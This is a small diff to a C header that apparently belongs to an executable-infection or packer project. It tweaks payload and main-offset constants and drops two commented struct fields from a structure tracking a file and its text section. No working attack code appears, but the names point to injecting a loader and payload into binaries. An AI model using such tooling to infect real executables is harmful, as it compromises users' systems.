@@ -19,8 +19,8 @@
 # define BUF_SIZE 0x20
 # define END_SIZE 0x5B
 # define LOADER_SIZE 0x57
-# define PAYLOAD_SIZE 0x232b - FT_MEMCPY_ADDR + 0x7
-# define MAIN_OFFSET 0x22bb - FT_MEMCPY_ADDR
+# define PAYLOAD_SIZE 0x2320 - FT_MEMCPY_ADDR + 0x7
+# define MAIN_OFFSET 0x22b0 - FT_MEMCPY_ADDR
 # define INJECT_SIZE LOADER_SIZE + END_SIZE + SIGN_SIZE + 4
 
 # define OFFSET_1 0x1b2a - FT_MEMCPY_ADDR
@@ -31,8 +31,6 @@ typedef struct		s_info
 {
 	void		*file;
 	size_t		file_size;
-	// 	void		*new_file;
-	// 	size_t		new_file_size;
 	void		*text_begin;
 	size_t		text_size;
 	size_t		text_addr;
